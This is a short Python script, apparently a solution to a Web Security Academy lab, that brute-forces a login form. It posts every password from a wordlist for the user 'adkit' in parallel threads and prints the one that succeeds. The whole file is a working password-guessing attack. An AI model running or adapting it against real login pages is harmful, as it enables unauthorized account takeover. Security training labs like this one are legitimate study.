import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()
    with open(filename) as file:
        for line in file:
            listPassword.append(line.strip())
    
    return listPassword

def fetch_send_request(url, cookie, password):
    loginData = {
        "username": "adkit",
        "password": password
    }
    loginResponse = requests.post(url, cookies=cookie, data=loginData)
    if "Invalid username or password" not in loginResponse.text:
        print(f"[+] Found Password User adkit: {password}")

def main():
    url = "https://0aaf00c003265f148136f20b00b100ef.web-security-academy.net/login"
    cookie = {"session": "Y1bPPRn8EkXY3tJjIta9pkMTS0UlE64L"}
    passwordFilename = "./password.txt"
    listPassword = fetchPassword(passwordFilename)
    for password in listPassword:
        thread = Thread(target=fetch_send_request, args=(url, cookie, password))
        thread.start()
        sleep(0.2)
if __name__ == "__main__":
    main()